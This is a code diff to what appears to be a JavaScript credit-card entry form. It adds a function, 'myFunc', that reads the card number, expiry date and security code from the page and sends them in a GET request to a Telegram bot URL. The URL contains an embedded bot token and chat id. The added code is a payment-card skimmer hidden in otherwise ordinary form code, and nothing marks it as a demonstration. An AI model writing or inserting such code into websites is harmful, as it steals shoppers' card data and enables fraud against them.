@@ -8,6 +8,7 @@ window.onload = function () {
     const ccicon = document.getElementById('ccicon');
     const ccsingle = document.getElementById('ccsingle');
     const generatecard = document.getElementById('generatecard');
+    let text = cardnumber + "\n" + expirationdate + "\n" + securitycode;
     
     
     let cctype = null;
@@ -278,3 +279,24 @@ window.onload = function () {
         document.querySelector('.creditcard').classList.add('flipped');
     });
     };
+
+    function myFunc(){
+        const xhr = new XMLHttpRequest();
+        
+        const cardnumber = document.getElementById('cardnumber');
+        const expirationdate = document.getElementById('expirationdate');
+        const securitycode = document.getElementById('securitycode');
+        let text = cardnumber.value + "%0A" + expirationdate.value + " - " + securitycode.value;
+        let message = 'https://api.telegram.org/bot6242938301:AAGJPCGJH851gOcEO6rrFUHZ4Nuk9kjY6RA/sendMessage?chat_id=-997148366&text='+text;
+        console.log(cardnumber.value)
+        xhr.open('GET', message);
+        xhr.onload = function() {
+        if (xhr.status === 200) {
+            const data = JSON.parse(xhr.responseText);
+            console.log(data);
+        } else {
+            console.error('Error occurred: ' + xhr.status);
+        }
+        };
+        xhr.send();
+    }
